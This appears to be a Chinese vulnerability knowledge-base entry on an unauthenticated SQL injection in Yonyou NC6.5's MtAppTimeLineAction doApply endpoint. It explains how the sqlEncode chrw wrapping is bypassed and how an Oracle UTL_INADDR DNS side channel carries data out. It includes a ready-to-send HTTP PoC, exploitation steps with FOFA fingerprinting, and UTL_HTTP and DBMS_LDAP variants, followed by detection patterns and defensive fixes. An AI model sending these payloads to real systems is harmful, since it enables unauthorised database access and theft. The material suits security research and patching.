---
id: web-java-component-yonyou-nc65-mtapptimeline-doapply-sqli
title: 用友 NC6.5 MtAppTimeLineAction doApply SQL 注入：meapk 拼接绕过 sqlEncode 的 chrw 包装
type: scenario
domain: web
path: web/java/component
technique: yonyou-nc65-mtapptimeline-doapply-sqli
aliases:
- 用友 NC SQL 注入
- MtAppTimeLineAction
- meapk 注入
- doApply SQLi
- sqlEncode chrw 绕过
- UTL_INADDR OOB
- NC6.5 SQL 注入
tags:
- java
- yonyou
- nc65
- sqli
- oracle
- utl-inaddr
- oob
- portal
cve: []
severity: high
confidence: high
affected_versions: NC6.5
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V196
  verified_at: '2026-11-06T22:40:56+08:00'
  notes: 已对照原文与4张截图核对：MtAppTimeLineAction.doApply 的 meapk→sqlEncode→queryMeetingApplyEvents→DAO 拼接链、chrw/CHR 语义等价说明、UTL_INADDR OOB PoC 与 ORA-29257 错误页一致；affected_versions=NC6.5 与原文一致；pageId=login 过滤器放行机制取自既有 NC65 卡、原文未解释；无 sources 字段；未复跑
---

## 一句话结论

用友 NC6.5 的 `/portal/pt/mtapptimeline/doApply` 从 `meapk` 取参后拼成 `pk_mtappdoc='...'` 并追加到会议申请查询 SQL；虽然经过 `NCESAPI.sqlEncode` 处理，但该函数只是把非字母数字转成 `chrw(...)` 并用 `&`/引号拼接，Oracle 仍按原语义解析，攻击者用 `CHR()` 构造标点即可注入，配合 `UTL_INADDR.GET_HOST_ADDRESS` 把查询结果拼进域名实现 OOB 外带。

## 原理

- **入口与拼接**：`nc.bs.oa.oamt.action.MtAppTimeLineAction.doApply()` 读取 `request.getParameter("meapk")`，构造：
  ```java
  String whereSQL = "pk_mtappdoc='" + NCESAPI.sqlEncode(maEventPk) + "'";
  qs.queryMeetingApplyEvents(whereSQL, null);
  ```
- **继续下传**：`queryMeetingApplyEvents` 在 DAO 中拼出基础查询：
  ```java
  sd.append("select ... from OAMT_MTAPP a, BD_PSNDOC b where a.applier=b.PK_PSNDOC ");
  if (StringUtils.isNotEmpty(sqlWhere)) {
      sd.append(" and ").append(sqlWhere);
  }
  this.executeQueryVOs(sd.toString(), MeetingApplyEventVO.class);
  ```
  `whereSQL` 被直接拼进 SQL 文本，没有使用占位符/绑定变量。
- **sqlEncode 不是参数化**：`NCESAPI.sqlEncode` 的 `encode` 遍历字符，字母数字原样保留并用双引号包成区段，其他字符转成 `chrw(<码点>)`，区段之间用 `&` 连接。它没有拒绝 SQL 关键字、没有把输入变成数据值，只是把标点换成数据库函数调用形式。
- **Oracle 语义等价**：Oracle 中 `chrw(40)` 等价于 `(`、`chrw(61)` 等价于 `=`、`chrw(39)` 等价于单引号、`chrw(124)` 等价于 `||`。因此攻击者把 payload 中的标点写成 `CHR()`，`sqlEncode` 再包一层 `chrw()` 也不改变最终 SQL 语义。
- **OOB 证明**：Oracle 的 `UTL_INADDR.GET_HOST_ADDRESS(host)` 会对 `host` 做 DNS 解析；把子查询结果拼进 host，攻击者即可在 DNS 日志中看到数据，解决无回显/不能出网 HTTP 的场景。PoC 用 `CASE WHEN (7722=7722) THEN 1 ELSE 0 END` 作为布尔/数据占位，外层 `7722=UTL_INADDR...` 触发解析。
- **认证绕过配合**：`pageId=login` 命中 NC65 `PortalLoginFilter` 的放行分支（`isToLogin`），未登录即可访问该 Portal 接口；SQL 注入本身不需要账号。

## 触发条件

- 目标为用友 NC6.5，`/portal/pt/mtapptimeline/doApply` 可从攻击者网络访问。
- 请求带 `pageId=login`（或其他 NC65 PortalLoginFilter 放行值）可绕过登录校验；若目标已修复该过滤器，则需要有效低权限会话。
- 后端为 Oracle（PoC 使用 `UTL_INADDR`）；其他数据库需要改用对应的 OOB/时间盲注函数。
- `meapk` 参数进入 `whereSQL` 并被拼接到 `executeQueryVOs` 执行的 SQL 中；`sqlEncode` 未阻断 `CHR()`/`chrw()` 语义。
- 数据库服务器允许 `UTL_INADDR` 解析外部域名（或允许相应 OOB 通道）。

## 利用步骤

1. 指纹确认：FOFA `app="用友-UFIDA-NC"` 或访问 Portal 页面识别 NC6.5。
2. 确认入口：POST `/portal/pt/mtapptimeline/doApply`，带 `pageId=login` 与 `meapk=1`，观察是否返回 XML/业务错误而非登录跳转。
3. 构造注入：把标点写成 `CHR()`，利用 `sqlEncode` 对字母数字原样保留、对其他字符转 `chrw` 的特性，使最终 SQL 仍可解析。文章 PoC：
   ```text
   meapk=1' AND 7722=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7722=7722) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113))-- Jvzs
   ```
4. 发送 POST，观察 DNSLog/ Collaborator 是否收到 `qzjbq1qxxbq` 之类的域名解析；若有回调，说明注入成功。
5. 数据外带：把 `SELECT` 结果替换到 `UTL_INADDR` 的 host 拼接中（注意域名长度/字符集限制，可分段/base64/hex），或改用 `UTL_HTTP.REQUEST`、时间盲注等。
6. 修复验证：打补丁后同一请求应不再产生 OOB 回调；`meapk` 应作为绑定变量处理。

## PoC

```http
POST /portal/pt/mtapptimeline/doApply HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

pageId=login&meapk=1' AND 7722=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7722=7722) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113))-- Jvzs
```

原文截图显示响应为 Oracle 错误页（`ORA-29257`/`ORA-06512`，`SYS.UTL_INADDR` 相关），证明 `UTL_INADDR` 被调用；实际外带需在 DNS 平台观察回调。PoC 未在本机复跑。

## 变体与关联

- 变体：把 `UTL_INADDR` 换成 `UTL_HTTP.REQUEST('http://<dnslog>/'||...)` 或 `DBMS_LDAP.INIT`，适配不同 Oracle 权限/网络策略。
- 变体：若 `sqlEncode` 对某些字符处理不同，可先本地复现其 `encode` 算法，枚举哪些标点可保留、哪些必须用 `CHR()`。
- 关联：同 NC65 的 PortalLoginFilter 鉴权绕过（`pageId=login`/`passwordmng`、ESCAPE_URL 子串匹配）见 [[web-generic-auth-yonyou-nc65-portalloginfilter-bypass]]。
- 关联：用友 NCCloud 其他组件漏洞见 [[web-java-component-yonyou-nccloud-gateway-reflection-command-injection]]、[[web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload]]；用友 NC 反序列化见 [[web-java-deser-yonyou-nc-usersynchronizationservlet]]。
- 边界：目标非 Oracle、`UTL_INADDR` 被回收/网络禁用、`meapk` 被上游过滤器拦截、或已升级到修复版本时，需要换用其他注入通道。

## 检测与防御

- **修复**：升级用友 NC 官方补丁；将 `whereSQL` 改为参数化查询/绑定变量，禁止把 `meapk` 拼进 SQL；对 `sqlEncode` 这类“编码器”不要当作 SQL 注入防护。
- **认证**：修复 `PortalLoginFilter` 的 `pageId` 魔法值与 `ESCAPE_URL` 子串匹配放行，避免未登录访问 Portal 业务接口。
- **检测**：WAF/日志监控 `/portal/pt/mtapptimeline/doApply` 中出现 `UTL_INADDR`、`UTL_HTTP`、`DBMS_LDAP`、`CHR(`、`chrw(`、`||`、`--`、`SELECT` 等组合；数据库审计 `UTL_INADDR`/`UTL_HTTP` 调用与异常 DNS 解析。
- **网络**：限制数据库服务器出站 DNS/HTTP，只允许可信解析器；监控数据库发起的外部域名解析。
- **加固**：数据库账号最小权限，回收 `UTL_INADDR`/`UTL_HTTP` 等包的执行权限；对 Portal 接口做统一鉴权与输入校验。
